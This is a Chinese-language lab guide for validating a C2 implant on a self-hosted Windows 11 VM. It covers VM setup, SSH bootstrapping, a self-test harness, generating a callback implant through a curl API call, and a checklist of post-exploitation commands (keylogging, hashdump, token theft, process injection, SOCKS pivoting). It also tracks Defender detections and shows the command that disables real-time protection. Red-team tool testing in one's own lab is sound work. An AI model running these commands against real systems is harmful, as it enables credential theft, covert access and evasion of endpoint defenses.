# 路线 A：本机免费 Windows VM 用户层彻底验证指南

目标：在 Apple Silicon Mac 上零成本搭一台**真 Windows + 真 Defender** 的虚拟机，
把 implant-win 用户层（自测套件 ~50 导出 + 全部 Windows-only 交互命令）测到"可用"标准。
全程不需要花钱、不需要真机。

- 虚拟化：UTM（免费，GitHub/Homebrew 版；App Store 版收费，别买）
- 系统：Windows 11 ARM64 评估版（微软官方免费，90 天；过期重装/快照回滚即可）
- 植入体：x86_64 PIC，经 Win11 ARM64 内置 x64 仿真（Prism）运行
- 已有资产：仓库里的整套远程验证 harness 原样复用，零改动

---

## 阶段 0：建虚拟机（你手动操作，约 40 分钟，大部分是等下载）

1. 安装 UTM：`brew install --cask utm`（或 https://github.com/utmapp/UTM/releases 下免费 dmg）
2. 打开 UTM → 图库（Gallery）→ 选 **Windows 11**。它会自动：
   - 下载 Win11 ARM64 ISO（经配套工具 CrystalFetch，免费）
   - 配好 TPM 2.0 / Secure Boot 仿真（Win11 安装硬性要求）
3. 资源建议：内存 ≥ 4 GB（最好 8 GB），磁盘 ≥ 64 GB，网络选默认 **Shared Network**（NAT）
4. 安装 Windows。到"连接网络/登录微软账户"环节时按 **Shift+F10** 打开 cmd，二选一：
   - `OOBE\BYPASSNROAM`（回车后自动重启，重启后选"我没有 Internet"）
   - 或 `start ms-cxh:localonly`（直接弹本地账户创建框）
   建一个**本地管理员账户**（记住用户名密码，ssh 要用）
5. 进桌面后：UTM 菜单装 **SPICE Guest Tools**（窗口自适应 + 剪贴板共享）
6. **打快照**(UTM 快照功能）。之后每个测试阶段前都建议打快照，随便折腾随时回滚

> 不激活 Windows 完全不影响测试（仅桌面水印 + 个性化设置锁定）。Defender 默认在场且实时保护开启——这正是要的对照环境。

## 阶段 1：VM 一键引导（在 VM 里跑一次）

把 `scripts/vm_bootstrap.ps1` 拷进 VM（共享文件夹/剪贴板/UTM 传输均可），
在**管理员 PowerShell** 里执行：

```powershell
# 方式一：剪贴板已通，直接粘贴 mac 公钥（mac 端 cat ~/.ssh/id_ed25519.pub）
powershell -ExecutionPolicy Bypass -File vm_bootstrap.ps1 -PubKey "ssh-ed25519 AAAA... you@mac"

# 方式二：剪贴板不通。mac 端在公钥目录起个临时 http：
#   python3 -m http.server 8899 --bind 0.0.0.0
# VM 里：
powershell -ExecutionPolicy Bypass -File vm_bootstrap.ps1 -PubKeyUrl "http://192.168.64.1:8899/id_ed25519.pub"
```

脚本做的事：装并启动 OpenSSH Server（开机自启 + 防火墙放行 22 端口）、
按 OpenSSH 的 ACL 要求写入 `administrators_authorized_keys`、创建 `C:\nyx`、
关睡眠、打印 VM 的 IPv4（UTM 共享网络下一般是 `192.168.64.x`）。

mac 端验证（密码或密钥任一能通即可，harness 需要**密钥**）：

```bash
ssh <用户名>@<VM-IP> hostname     # 应输出 VM 主机名
```

## 阶段 2：自测套件全量跑（约 50 个导出，自动校验退出码）

上一轮（g1-g5）给远程 Windows 服务器写的 harness 原样可用，只换 `WIN_HOST`：

```bash
# mac 端，仓库根目录
WIN_HOST=<VM-IP> ./scripts/win_remote_run.sh all
```

它做的事：交叉编译 selftest DLL → 提取导出表 → scp 到 VM →
以 SYSTEM 计划任务跑 `win_selftest_all.ps1 -Validate` → 拉回 CSV 和日志并给出 PASS/FAIL。
覆盖了 token 操作、keylog、screenshot、inject、hashdump、BOF、fs/net、
evasion 自检等全部用户层原语，多数导出有精确期望退出码。

**ARM64 x64 仿真注意（先冒烟，再全量）**:

- 第一步先单跑校准导出确认仿真链路通：
  `ssh <用户>@<VM-IP> "rundll32 C:\nyx\nyx_implant_win.dll,nyx_selftest_calib42" ; echo %ERRORLEVEL%`
  （先 `win_remote_run.sh build` 把 DLL 送上去）应得退出码 **42**。得 42 则仿真加载 x64 DLL 没问题，继续全量
- `inject` 类测试的目标进程必须是 **x64 仿真进程**，不能注入 ARM64 原生进程
- CET shadow stack 在仿真环境下不存在——CET 相关验证走 CI runner（路线 B），这里跳过即可
- 性能比原生 x64 慢一些，单导出超时已在脚本里留了余量

结果判读：日志里 `VALIDATION: N validated, 0 mismatches` + `PASS:` 即套件绿。
有 mismatch 按导出名对照 `win_selftest_all.ps1` 顶部的期望码表查。

## 阶段 3：交互式 C2 全命令演练（真 C2 回路）

自测套件验证的是原语，这一步验证**完整 C2 会话**:

```bash
# 1. mac 端启 server，绑定到 VM 可达的地址（UTM 共享网络下 mac 是 192.168.64.1）
NYX_BIND=0.0.0.0:8443 NYX_ALLOW_OPEN=1 cargo run --release -p nyx-server
#    记下启动时输出的 X25519 公钥 hex

# 2. mac 端起 GUI（连 http://127.0.0.1:8443）
cd crates/client-ui-web && npm run tauri dev

# 3. 生成 callback 指向 mac 的 implant（REST，见 README 快速上手第 5 节）
curl -X POST http://127.0.0.1:8443/api/generate-implant \
  -H "Content-Type: application/json" \
  -d '{"callback":"192.168.64.1","port":8443,"format":"dll"}'

# 4. scp 进 VM，执行（rundll32 或你的 loader），GUI 里应出现新 beacon
```

然后在 GUI 命令框按这张清单逐条过（⭐ = wine 测不了、本轮首次获得真 Windows 证据）：

```
ping / sleep 5 / getuid / env / net
ls C:\ / upload / download / mv / cp / rm
shell whoami /all
screenshot ⭐          screenwatch ⭐
clipboard ⭐           keylog start → 敲几个字 → keylog dump ⭐
hashdump ⭐（需 SYSTEM/Administrator）
stealtoken <pid> ⭐ → getuid → rev2self ⭐
maketoken <u> <d> <p> ⭐ → rev2self
inject <pid> <hex> 0 / 1 / 2 ⭐（三种注入模式各一次；目标选 x64 进程）
bof <hex> / bof <hex> isolate（对照：隔离模式崩溃不拖垮 beacon）
portscan 192.168.64.1 22,80,443
socks 1080 → 经代理 curl 一个内网地址 ⭐
connect 127.0.0.1 8443（rportfwd 回连）
trex（EDR 自评分级，对照阶段 4 的 Defender 实况）
```

每条命令记录：返回是否符合预期、beacon 是否存活、Defender 有无反应（见阶段 4）。

## 阶段 4：Defender 对照（两遍）

VM 里随时可查：

```powershell
Get-MpComputerStatus | Select RealTimeProtectionEnabled,AntivirusEnabled
Get-MpThreatDetection        # 检出历史（空 = 没被发现）
Get-MpPreference | Select ExclusionPath
```

- **第一遍（Defender ON，默认）**：阶段 2+3 全量跑。任何一步被检出/被杀，记录
  `Get-MpThreatDetection` 的 ThreatName 和时间点，这就是最真实的最小 EDR 对照
- **第二遍（Defender OFF，快照回滚后）**:
  `Set-MpPreference -DisableRealtimeMonitoring $true`（如被 Tamper Protection 拦，
  先在 Windows 安全中心 UI 关篡改防护）。用于区分"功能 bug"和"被 Defender 拦"——
  第一遍失败的项第二遍能过 = 检测问题不是功能问题

## 收尾：写验证报告

参照 `docs/testing/g1-g5-real-machine-verify-2026-06-27.md` 的格式，把三份东西归档：

1. `win_remote_run.sh` 拉回的 `selftest_results.csv` + `selftest_run.log`
2. 阶段 3 命令清单的逐项结果
3. Defender 两遍的 `Get-MpThreatDetection` 对比

## 常见坑

- **ssh 连不上**:VM 里 `Get-Service sshd` 确认 Running；确认用的是 `192.168.64.x` 地址
- **公钥不生效**:`administrators_authorized_keys` 的 ACL 必须只有 SYSTEM+Administrators
  （bootstrap 脚本已处理；手工改的话别漏 `icacls /inheritance:r`）
- **harness 报 BatchMode 失败**：密钥没配上，重跑 bootstrap 带 `-PubKey`
- **win_remote_run.sh 中途中断**：直接重跑 `run`，它是断点续跑设计（DONE 标记轮询）
- **VM 很卡**：确认装的是 ARM64 版 Windows 而非 x64 ISO 模拟（UTM 图库模板就是 ARM64，
  只有植入体本身跑仿真，系统全原生）
- **90 天到期**：回滚到初始快照重来即可；评估版可重新装机
